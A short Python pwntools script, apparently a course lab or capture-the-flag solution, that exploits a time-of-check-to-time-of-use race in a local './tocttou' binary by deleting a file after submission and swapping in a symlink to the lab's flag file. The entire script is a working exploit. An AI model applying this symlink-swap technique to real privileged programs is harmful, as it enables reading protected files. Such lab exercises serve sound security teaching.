#!/usr/bin/env python

from pwn import *
import os

p = process('./tocttou')
print(p.recvline())
print(p.recvline())
print(p.recvline())

p.sendline('f')
time.sleep(1)
os.remove('f')
os.symlink('/home/labs/week7/7-tocttou/flag','f')

print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
